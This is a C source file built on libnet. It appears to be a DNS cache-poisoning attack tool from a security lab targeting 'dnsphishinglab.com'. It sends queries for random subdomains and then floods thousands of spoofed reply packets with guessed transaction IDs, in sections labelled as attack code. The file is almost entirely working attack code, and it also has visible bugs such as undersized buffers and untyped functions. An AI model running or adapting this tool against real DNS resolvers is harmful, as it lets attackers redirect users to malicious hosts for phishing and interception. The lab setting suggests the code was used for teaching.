#include <libnet.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>


/////////////////////////
//////REQUEST INIT//////
////////////////////////


int xx=1;

    int length;
    char len[];
    char domain[]="dnsphishinglab.com";
    int c;
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];
    
    char eth_file[FILENAME_MAX] = "";
    char ip_file[FILENAME_MAX] = "";
    char tcp_file[FILENAME_MAX] = "";
    char payload_file[FILENAME_MAX] = "";
    char *payload_location;
    
    int x;
    int y = 0;
    int udp_src_port = 1;       /* UDP source port */
    int udp_des_port = 1;       /* UDP dest port */
    int z;
    int i;
    int payload_filesize = 0;

    int t_src_port;		/* TCP source port */
    int t_des_port;		/* TCP dest port */
    int t_win;		/* TCP window size */
    int t_urgent;		/* TCP urgent data pointer */
    int i_id;		/* IP id */
    int i_frag;		/* IP frag */
    u_short head_type;          /* TCP or UDP */

    u_long t_ack;		/* TCP ack number */
    u_long t_seq;		/* TCP sequence number */
    u_long i_des_addr;		/* IP dest addr */
    u_long i_src_addr;		/* IP source addr */

    u_char i_ttos[90];		/* IP TOS string */
    u_char t_control[65];	/* TCP control string */

    u_char eth_saddr[6];	/* NULL Ethernet saddr */
    u_char eth_daddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_proto[60];       /* Ethernet protocal */
    int eth_pktcount;        /* How many packets to send */
    int nap_time;              /* How long to sleep */

    u_char ip_proto[40];

    u_char spa[4]={0x0, 0x0, 0x0, 0x0};
    u_char tpa[4]={0x0, 0x0, 0x0, 0x0};

    u_char *device = NULL;
    u_char i_ttos_val = 0;	/* final or'd value for ip tos */
    u_char t_control_val = 0;	/* final or'd value for tcp control */
    int i_ttl;		/* IP TTL */
    u_short e_proto_val = 0;    /* final resulting value for eth_proto */
    u_short ip_proto_val = 0;   /* final resulting value for ip_proto */


//////////////////////////////
/////ATTACK INIT////////////
///////////////////////////


    //int c;
    u_char *cp;
    libnet_t *la;
    libnet_ptag_t ta;
    //char errbuf[LIBNET_ERRBUF_SIZE];
    
    char eth_file_a[FILENAME_MAX] = "";
    char ip_file_a[FILENAME_MAX] = "";
    char tcp_file_a[FILENAME_MAX] = "";
    char payload_file_a[FILENAME_MAX] = "";
    char *payload_function_a;
    
    //int x;
    //int y = 0;
    int udp_src_port_a = 1;       /* UDP source port */
    int udp_des_port_a = 1;       /* UDP dest port */
    //int z;
    //int i;
    int payload_filesize_a = 0;

    int t_src_port_a;        /* TCP source port */
    int t_des_port_a;        /* TCP dest port */
    int t_win_a;        /* TCP window size */
    int t_urgent_a;        /* TCP urgent data pointer */
    int i_id_a;        /* IP id */
    int i_frag_a;        /* IP frag */
    u_short head_type_a;          /* TCP or UDP */

    u_long t_ack_a;        /* TCP ack number */
    u_long t_seq_a;        /* TCP sequence number */
    u_long i_des_addr_a;        /* IP dest addr */
    u_long i_src_addr_a;        /* IP source addr */

    u_char i_ttos_a[90];        /* IP TOS string */
    u_char t_control_a[65];    /* TCP control string */

    u_char eth_saddr_a[6];    /* NULL Ethernet saddr */
    u_char eth_daddr_a[6];     /* NULL Ethernet daddr */
    u_char eth_proto_a[60];       /* Ethernet protocal */
    int eth_pktcount_a;        /* How many packets to send */
    int nap_time_a;              /* How long to sleep */

    u_char ip_proto_a[40];

    //u_char spa[4]={0x0, 0x0, 0x0, 0x0};
    //u_char tpa[4]={0x0, 0x0, 0x0, 0x0};

    //u_char *device = NULL;
    u_char i_ttos_val_a = 0;    /* final or'd value for ip tos */
    u_char t_control_val_a = 0;    /* final or'd value for tcp control */
    int i_ttl_a;        /* IP TTL */
    u_short e_proto_val_a = 0;    /* final resulting value for eth_proto_a */
    u_short ip_proto_val_a = 0;   /* final resulting value for ip_proto_a */




/////////////////////////
//////MAIN///////////////
////////////////////////



int main(int argc, char *argv[])
{

///////////////////////////
////WRITING INTO BUFFERS//
//////////////////////////
    while ((c = getopt (argc, argv, "p:t:i:e:a:b:c:d:")) != EOF)
    {
        switch (c)
        {
            case 'p':
                strcpy(payload_file, optarg);
                break;
            case 't':
                strcpy(tcp_file, optarg);
                break;
            case 'i':
                strcpy(ip_file, optarg);
                break;
            case 'e':
                strcpy(eth_file, optarg);
                break;
	    case 'a':
                strcpy(payload_file_a, optarg);
                break;
            case 'b':
                strcpy(tcp_file_a, optarg);
                break;
            case 'c':
                strcpy(ip_file_a, optarg);
                break;
            case 'd':
                strcpy(eth_file_a, optarg);
                break;
            default:
                break;
        }
    }

    if (optind != 17)
    {    
        printf("error in arguments");
        exit(0);
    }
	///////////////////////
        ///////////////////////
	/////REQUEST PACKET///
	//////////////////////
	//////////////////////

////////////////////////
////REQUEST LOADING////
///////////////////////

    load_ethernet();
    load_tcp_udp();
    load_ip();
    convert_proto();


///////////////////////
////SEND REQUEST//////
/////////////////////

   

printf("calling load payload");
    load_payload_request();

int ccc=0;
while(ccc<100000)
{
int randomNumber1=0;
int randomNumber2=0;
int randomNumber3=0;
printf("\nin while loop iteration %d\n",ccc+1);
ccc++;
char random_host_name[3];
random_host_name[0]="";
random_host_name[1]="";
random_host_name[2]="";

    l = libnet_init(
            LIBNET_LINK,                             /* injection type */
            "eth14",                                    /* network interface eth0, eth1, etc. NULL is default.*/
	  //  "eth0",                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }


 srand(time(NULL)+xx);
     xx++;
    randomNumber1 = (rand()%15);
         srand(time(NULL)+xx);
     xx++;
    randomNumber2 = (rand()%15); 
         srand(time(NULL)+xx);
     xx++;
    randomNumber3 = (rand()%15);
    
    //random_host_name[0]=randomNumber1;
    //random_host_name[1]=randomNumber2;
    //random_host_name[2]=randomNumber3;
    sprintf(random_host_name, "%x%x%x", randomNumber1,randomNumber2,randomNumber3);
    
    printf("starting attack with %s \n", random_host_name);


    length=strlen(random_host_name);
    printf("length is : %d",length);
/*
int j=0;
    i=13;
      
            
            for (j=0;j<length;j++) 
	    {
                *(payload_location + i + j) = random_host_name[j];
		
            }

*/
payload_location[13]=random_host_name[0];
payload_location[14]=random_host_name[1];
payload_location[15]=random_host_name[2];


if(ip_proto_val==IPPROTO_TCP){    
    t = libnet_build_tcp(
        t_src_port,                                    /* source port */
        t_des_port,                                    /* destination port */
        t_seq,                                         /* sequence number */
        t_ack,                                         /* acknowledgement num */
        t_control_val,                                 /* control flags */
        t_win,                                         /* window size */
        0,                                             /* checksum */
        t_urgent,                                      /* urgent pointer */
        LIBNET_TCP_H + payload_filesize,               /* TCP packet size */
	payload_location,                              /* payload */
        payload_filesize,                              /* payload size */
        l,                                             /* libnet handle */
        0);                                            /* libnet id */
    head_type = LIBNET_TCP_H;
    if (t == -1)
    {
        fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
        goto bad;
    }
}
 
if(ip_proto_val==IPPROTO_UDP){
        t = libnet_build_udp(
	    t_src_port,                                /* source port */
	    t_des_port,                                /* destination port */
	    LIBNET_UDP_H + payload_filesize,           /* packet length */
	    0,                                         /* checksum */
	    payload_location,                          /* payload */
	    payload_filesize,                          /* payload size */
	    l,                                         /* libnet handle */
	    0);                                        /* libnet id */
    head_type = LIBNET_UDP_H;
    if (t == -1)
    {
        fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
        goto bad;
    }
}


    t = libnet_build_ipv4(
/*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
        LIBNET_IPV4_H + head_type + payload_filesize,          /* length */
	i_ttos_val,                                            /* TOS */
        i_id,                                                  /* IP ID */
        i_frag,                                                /* IP Frag */
        i_ttl,                                                 /* TTL */
        ip_proto_val,                                          /* protocol */
        0,                                                     /* checksum */
        i_src_addr,                                            /* source IP */
        i_des_addr,                                            /* destination IP */
        NULL,                                                  /* payload */
        0,                                                     /* payload size */
        l,                                                     /* libnet handle */
        0);                                                    /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
        goto bad;
    }

    t = libnet_build_ethernet(
        eth_daddr,                                   /* ethernet destination */
        eth_saddr,                                   /* ethernet source */
        e_proto_val,                                 /* protocol type */
        NULL,                                        /* payload */
        0,                                           /* payload size */
        l,                                           /* libnet handle */
        0);                                          /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
        goto bad;
    }
     /*	
     *  Write it to the wire.
     */

if (nap_time >= 0)
	printf("You have chosen to send %d packets every %d seconds. \nYou will need to press CTRL-C to halt this process.\n", eth_pktcount, nap_time);

if (nap_time == -1)
	printf("You have chose to send %d packets and quit.\n",eth_pktcount);
	

     c = libnet_write(l);
     
     if (nap_time == -1){
	     y=999;
	     nap_time = 0;
      }
     sleep(nap_time);         /*Pause of this many seconds then loop again*/
     z=1;
      

printf("****  %d request packet sent  **** (packetsize: %d bytes each)\n",eth_pktcount,c);  /* tell them what we just did */

    /* give the buf memory back */

////////////////////////
///////////////////////
/////ATTACK PACKETS///
/////////////////////
/////////////////////

    load_payload_a();
    load_ethernet_a();
    load_tcp_udp_a();
    load_ip_a();
    convert_proto_a();
int sid=0;
for(sid=0;sid<5000;sid++)
{
printf("entering loop number %d",sid+1);
	la = libnet_init(
            LIBNET_LINK,                             /* injection type */
            "eth14",                                    /* network interface eth0, eth1, etc. NULL is default.*/
      //  "eth13",                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */

    if (la == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }
////////////////////
///ATTACK LOADING//
///////////////////
    
	printf("\nadding\n");
          
		payload_function_a[13]=random_host_name[0];
		payload_function_a[14]=random_host_name[1];
		payload_function_a[15]=random_host_name[2];
            
        


    
    srand(time(NULL)+xx);
    xx++;
    char random[2];
    int randomNumber1 = (rand()%256);
    srand(time(NULL)+xx);
    xx++;
    int randomNumber2 = (rand()%256);
     sprintf(random, "%x%x", randomNumber1,randomNumber2);
printf("random id is : %s \n",random);
//fread(payload_function_a,sizeof(char),2,random);
    *payload_function_a = random[0];
    *(payload_function_a+1) = random[1];

/////////////////////
///ATTACK SEND PACK//
////////////////////




if(ip_proto_val_a==IPPROTO_TCP){    
    ta = libnet_build_tcp(
        t_src_port_a,                                    /* source port */
        t_des_port_a,                                    /* destination port */
        t_seq_a,                                         /* sequence number */
        t_ack_a,                                         /* acknowledgement num */
        t_control_val_a,                                 /* control flags */
        t_win_a,                                         /* window size */
        0,                                             /* checksum */
        t_urgent_a,                                      /* urgent pointer */
        LIBNET_TCP_H + payload_filesize_a,               /* TCP packet size */
    payload_function_a,                              /* payload */
        payload_filesize_a,                              /* payload size */
        la,                                             /* libnet handle */
        0);                                            /* libnet id */
    head_type_a = LIBNET_TCP_H;
    if (ta == -1)
    {
        fprintf(stderr, "Can'ta build TCP header: %s\n", libnet_geterror(la));
        goto bad;
    }
}
 
if(ip_proto_val_a==IPPROTO_UDP){
        ta = libnet_build_udp(
        t_src_port_a,                                /* source port */
        t_des_port_a,                                /* destination port */
        LIBNET_UDP_H + payload_filesize_a,           /* packet length */
        0,                                         /* checksum */
        payload_function_a,                          /* payload */
        payload_filesize_a,                          /* payload size */
        la,                                         /* libnet handle */
        0);                                        /* libnet id */
    head_type_a = LIBNET_UDP_H;
    if (ta == -1)
    {
        fprintf(stderr, "Can'ta build UDP header: %s\n", libnet_geterror(la));
        goto bad;
    }
}


    ta = libnet_build_ipv4(
/*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
        LIBNET_IPV4_H + head_type_a + payload_filesize_a,          /* length */
    i_ttos_val_a,                                            /* TOS */
        i_id_a,                                                  /* IP ID */
        i_frag_a,                                                /* IP Frag */
        i_ttl_a,                                                 /* TTL */
        ip_proto_val_a,                                          /* protocol */
        0,                                                     /* checksum */
        i_src_addr_a,                                            /* source IP */
        i_des_addr_a,                                            /* destination IP */
        NULL,                                                  /* payload */
        0,                                                     /* payload size */
        la,                                                     /* libnet handle */
        0);                                                    /* libnet id */
    if (ta == -1)
    {
        fprintf(stderr, "Can'ta build IP header: %s\n", libnet_geterror(la));
        goto bad;
    }

    ta = libnet_build_ethernet(
        eth_daddr_a,                                   /* ethernet destination */
        eth_saddr_a,                                   /* ethernet source */
        e_proto_val_a,                                 /* protocol type */
        NULL,                                        /* payload */
        0,                                           /* payload size */
        la,                                           /* libnet handle */
        0);                                          /* libnet id */
    if (ta == -1)
    {
        fprintf(stderr, "Can'ta build ethernet header: %s\n", libnet_geterror(la));
        goto bad;
    }
     /*    
     *  Write it to the wire.
     */
/*
if (nap_time_a >= 0)
    printf("You have chosen to send %d packets every %d seconds. \nYou will need to press CTRL-C to halt this process.\n", eth_pktcount_a, nap_time_a);

if (nap_time_a == -1)
    printf("You have chose to send %d packets and quit.\n",eth_pktcount_a);
    */
    
     c = libnet_write(la);
	printf("attack packet sent\n");
        
    

     if (nap_time_a == -1){
         y=999;
         nap_time_a = 0;
      }
     sleep(nap_time_a);         /*Pause of this many seconds then loop again*/
     z=1;


//printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",eth_pktcount_a,c);  /* tell them what we just did */

    /* give the buf memory back */

    libnet_destroy(la);




























































}//end of for.. Attacks packets



























libnet_destroy(l);


    
}//end while loop




printf("\ndone\n");
return 0;

bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
}

































////////////////////////
///REQUEST FUNCTIONS///
///////////////////////


load_payload_request()
{
	FILE *infile;
    struct stat statbuf;
    int i = 0;
    int c = 0;
    int j=0;
    
    

    /* get the file size so we can figure out how much memory to allocate */
 
    stat(payload_file, &statbuf);
    payload_filesize = statbuf.st_size;
    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }

	 /* open the file and read it into memory */

    infile = fopen(payload_file, "r");	/* open the payload file read only */
    
    while((c = getc(infile)) != EOF)
    {
	
        
	
	
        *(payload_location + i) = c;
        i++;
    }
	
            
      

    fclose(infile);


}



















    /* load_ethernet: load ethernet data file into the variables */
load_ethernet()
{
    FILE *infile;

    char s_read[40];
    char d_read[40];
    char p_read[60];
    char count_line[40];

    infile = fopen(eth_file, "r");

    fgets(s_read, 40, infile);         /*read the source mac*/
    fgets(d_read, 40, infile);         /*read the destination mac*/
    fgets(p_read, 60, infile);         /*read the desired protocal*/
    fgets(count_line, 40, infile);     /*read how many packets to send*/

    sscanf(s_read, "saddr,%x, %x, %x, %x, %x, %x", &eth_saddr[0], &eth_saddr[1], &eth_saddr[2], &eth_saddr[3], &eth_saddr[4], &eth_saddr[5]);
    sscanf(d_read, "daddr,%x, %x, %x, %x, %x, %x", &eth_daddr[0], &eth_daddr[1], &eth_daddr[2], &eth_daddr[3], &eth_daddr[4], &eth_daddr[5]);
    sscanf(p_read, "proto,%s", &eth_proto);
    sscanf(count_line, "pktcount,%d", &eth_pktcount);

    fclose(infile);
}

    /* load_tcp_udp: load TCP or UDP data file into the variables */
load_tcp_udp()
{
    FILE *infile;

    char sport_line[20] = "";
    char dport_line[20] = "";
    char seq_line[20] = "";
    char ack_line[20] = "";
    char control_line[65] = "";
    char win_line[20] = "";
    char urg_line[20] = "";

    infile = fopen(tcp_file, "r");

    fgets(sport_line, 15, infile);	/*read the source port*/
    fgets(dport_line, 15, infile); 	/*read the dest port*/
    fgets(win_line, 12, infile);	/*read the win num*/
    fgets(urg_line, 12, infile);	/*read the urg id*/
    fgets(seq_line, 13, infile);	/*read the seq num*/
    fgets(ack_line, 13, infile);	/*read the ack id*/
    fgets(control_line, 63, infile);	/*read the control flags*/

    /* parse the strings and throw the values into the variable */

    sscanf(sport_line, "sport,%d", &t_src_port);
    sscanf(sport_line, "sport,%d", &udp_src_port);
    sscanf(dport_line, "dport,%d", &t_des_port);
    sscanf(dport_line, "dport,%d", &udp_des_port);
    sscanf(win_line, "win,%d", &t_win);
    sscanf(urg_line, "urg,%d", &t_urgent);
    sscanf(seq_line, "seq,%ld", &t_seq);
    sscanf(ack_line, "ack,%ld", &t_ack);
    sscanf(control_line, "control,%[^!]", &t_control);

    fclose(infile); /*close the file*/
}

    /* load_ip: load IP data file into memory */
load_ip()
{
    FILE *infile;

    char proto_line[40] = "";
    char id_line[40] = "";
    char frag_line[40] = "";
    char ttl_line[40] = "";
    char saddr_line[40] = "";
    char daddr_line[40] = "";
    char tos_line[90] = "";
    char z_zsaddr[40] = "";
    char z_zdaddr[40] = "";
    char inter_line[15]="";

    infile = fopen(ip_file, "r");

    fgets(id_line, 11, infile);		/* this stuff should be obvious if you read the above subroutine */
    fgets(frag_line, 13, infile);	/* see RFC 791 for details */
    fgets(ttl_line, 10, infile);
    fgets(saddr_line, 24, infile);
    fgets(daddr_line, 24, infile);
    fgets(proto_line, 40, infile);
    fgets(inter_line, 15, infile);
    fgets(tos_line, 78, infile);
    
    sscanf(id_line, "id,%d", &i_id);
    sscanf(frag_line, "frag,%d", &i_frag);
    sscanf(ttl_line, "ttl,%d", &i_ttl);
    sscanf(saddr_line, "saddr,%s", &z_zsaddr);
    sscanf(daddr_line, "daddr,%s", &z_zdaddr);
    sscanf(proto_line, "proto,%s", &ip_proto);
    sscanf(inter_line, "interval,%d", &nap_time);
    sscanf(tos_line, "tos,%[^!]", &i_ttos);

    i_src_addr = libnet_name2addr4(l, z_zsaddr, LIBNET_RESOLVE);
    i_des_addr = libnet_name2addr4(l, z_zdaddr, LIBNET_RESOLVE);
    
    fclose(infile);
}

convert_proto()
{

/* Need to add more Ethernet and IP protocals to choose from */

	if(strstr(eth_proto, "arp") != NULL)
	  e_proto_val = e_proto_val | ETHERTYPE_ARP;

	if(strstr(eth_proto, "ip") != NULL)
	  e_proto_val = e_proto_val | ETHERTYPE_IP;

	if(strstr(ip_proto, "tcp") != NULL)
        ip_proto_val = ip_proto_val | IPPROTO_TCP;

	if(strstr(ip_proto, "udp") != NULL)
	  ip_proto_val = ip_proto_val | IPPROTO_UDP;
}













////////////////////////////
/////ATTACK FUNCTIONS//////
///////////////////////////

load_payload_a()
{
    FILE *infile;
    struct stat statbuf;
    int i = 0;
    int c = 0;
    int j=0;

    /* get the file size so we can figure out how much memory to allocate */
 
    stat(payload_file_a, &statbuf);
    payload_filesize_a = statbuf.st_size;

    payload_function_a = (char *)malloc(payload_filesize_a * sizeof(char));
    if (payload_function_a == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }

    /* open the file and read it into memory */

    infile = fopen(payload_file_a, "r");    /* open the payload file read only */
    
    while((c = getc(infile)) != EOF)
    {
        *(payload_function_a + i) = c;
        i++;
    }


    fclose(infile);
}

 /* load_ethernet: load ethernet data file into the variables */
load_ethernet_a()
{
    FILE *infile;

    char s_read[40];
    char d_read[40];
    char p_read[60];
    char count_line[40];

    infile = fopen(eth_file_a, "r");

    fgets(s_read, 40, infile);         /*read the source mac*/
    fgets(d_read, 40, infile);         /*read the destination mac*/
    fgets(p_read, 60, infile);         /*read the desired protocal*/
    fgets(count_line, 40, infile);     /*read how many packets to send*/

    sscanf(s_read, "saddr,%x, %x, %x, %x, %x, %x", &eth_saddr_a[0], &eth_saddr_a[1], &eth_saddr_a[2], &eth_saddr_a[3], &eth_saddr_a[4], &eth_saddr_a[5]);
    sscanf(d_read, "daddr,%x, %x, %x, %x, %x, %x", &eth_daddr_a[0], &eth_daddr_a[1], &eth_daddr_a[2], &eth_daddr_a[3], &eth_daddr_a[4], &eth_daddr_a[5]);
    sscanf(p_read, "proto,%s", &eth_proto_a);
    sscanf(count_line, "pktcount,%d", &eth_pktcount_a);

    fclose(infile);
}

    /* load_tcp_udp: load TCP or UDP data file into the variables */
load_tcp_udp_a()
{
    FILE *infile;

    char sport_line[20] = "";
    char dport_line[20] = "";
    char seq_line[20] = "";
    char ack_line[20] = "";
    char control_line[65] = "";
    char win_line[20] = "";
    char urg_line[20] = "";

    infile = fopen(tcp_file_a, "r");

    fgets(sport_line, 15, infile);    /*read the source port*/
    fgets(dport_line, 15, infile);     /*read the dest port*/
    fgets(win_line, 12, infile);    /*read the win num*/
    fgets(urg_line, 12, infile);    /*read the urg id*/
    fgets(seq_line, 13, infile);    /*read the seq num*/
    fgets(ack_line, 13, infile);    /*read the ack id*/
    fgets(control_line, 63, infile);    /*read the control flags*/

    /* parse the strings and throw the values into the variable */

    sscanf(sport_line, "sport,%d", &t_src_port_a);
    sscanf(sport_line, "sport,%d", &udp_src_port_a);
    sscanf(dport_line, "dport,%d", &t_des_port_a);
    sscanf(dport_line, "dport,%d", &udp_des_port_a);
    sscanf(win_line, "win,%d", &t_win_a);
    sscanf(urg_line, "urg,%d", &t_urgent_a);
    sscanf(seq_line, "seq,%ld", &t_seq_a);
    sscanf(ack_line, "ack,%ld", &t_ack_a);
    sscanf(control_line, "control,%[^!]", &t_control_a);

    fclose(infile); /*close the file*/
}

    /* load_ip: load IP data file into memory */
load_ip_a()
{
    FILE *infile;

    char proto_line[40] = "";
    char id_line[40] = "";
    char frag_line[40] = "";
    char ttl_line[40] = "";
    char saddr_line[40] = "";
    char daddr_line[40] = "";
    char tos_line[90] = "";
    char z_zsaddr[40] = "";
    char z_zdaddr[40] = "";
    char inter_line[15]="";

    infile = fopen(ip_file_a, "r");

    fgets(id_line, 11, infile);        /* this stuff should be obvious if you read the above subroutine */
    fgets(frag_line, 13, infile);    /* see RFC 791 for details */
    fgets(ttl_line, 10, infile);
    fgets(saddr_line, 24, infile);
    fgets(daddr_line, 24, infile);
    fgets(proto_line, 40, infile);
    fgets(inter_line, 15, infile);
    fgets(tos_line, 78, infile);
    
    sscanf(id_line, "id,%d", &i_id_a);
    sscanf(frag_line, "frag,%d", &i_frag_a);
    sscanf(ttl_line, "ttl,%d", &i_ttl_a);
    sscanf(saddr_line, "saddr,%s", &z_zsaddr);
    sscanf(daddr_line, "daddr,%s", &z_zdaddr);
    sscanf(proto_line, "proto,%s", &ip_proto_a);
    sscanf(inter_line, "interval,%d", &nap_time_a);
    sscanf(tos_line, "tos,%[^!]", &i_ttos_a);

    i_src_addr_a = libnet_name2addr4(la, z_zsaddr, LIBNET_RESOLVE);
    i_des_addr_a = libnet_name2addr4(la, z_zdaddr, LIBNET_RESOLVE);
    
    fclose(infile);
}

convert_proto_a()
{

/* Need to add more Ethernet and IP protocals to choose from */

    if(strstr(eth_proto_a, "arp") != NULL)
      e_proto_val_a = e_proto_val_a | ETHERTYPE_ARP;

    if(strstr(eth_proto_a, "ip") != NULL)
      e_proto_val_a = e_proto_val_a | ETHERTYPE_IP;

    if(strstr(ip_proto_a, "tcp") != NULL)
        ip_proto_val_a = ip_proto_val_a | IPPROTO_TCP;

    if(strstr(ip_proto_a, "udp") != NULL)
      ip_proto_val_a = ip_proto_val_a | IPPROTO_UDP;
}


